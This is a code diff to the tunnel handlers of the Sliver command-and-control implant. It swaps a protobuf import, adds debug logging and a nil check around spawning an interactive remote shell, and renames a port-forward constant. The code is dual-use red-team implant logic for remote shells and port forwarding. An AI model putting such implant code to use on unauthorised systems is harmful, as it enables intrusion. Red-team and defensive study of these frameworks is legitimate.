@@ -1,5 +1,3 @@
-// +build windows linux darwin
-
 package handlers
 
 /*
@@ -36,7 +34,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 
-	"github.com/golang/protobuf/proto"
+	"google.golang.org/protobuf/proto"
 )
 
 const (
@@ -58,6 +56,9 @@ var (
 
 // GetTunnelHandlers - Returns a map of tunnel handlers
 func GetTunnelHandlers() map[uint32]TunnelHandler {
+	// {{if .Config.Debug}}
+	log.Printf("[tunnel] Tunnel handlers %v", tunnelHandlers)
+	// {{end}}
 	return tunnelHandlers
 }
 
@@ -195,10 +196,19 @@ func shellReqHandler(envelope *sliverpb.Envelope, connection *transports.Connect
 
 	shellPath := shell.GetSystemShellPath(shellReq.Path)
 	systemShell := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
+	if systemShell == nil {
+		// {{if .Config.Debug}}
+		log.Printf("[shell] Failed to get system shell")
+		// {{end}}
+		return
+	}
 	go systemShell.StartAndWait()
 	// Wait for the process to actually spawn
 	for {
 		if systemShell.Command.Process == nil {
+			// {{if .Config.Debug}}
+			log.Printf("[shell] Waiting for process to spawn ...")
+			// {{end}}
 			time.Sleep(time.Second)
 		} else {
 			break
@@ -308,7 +318,7 @@ func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 	portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
 		Port:     portfwdReq.Port,
 		Host:     portfwdReq.Host,
-		Protocol: sliverpb.PortfwdProtocol_TCP,
+		Protocol: sliverpb.PortFwdProtoTCP,
 		TunnelID: portfwdReq.TunnelID,
 	})
 	connection.Send <- &sliverpb.Envelope{
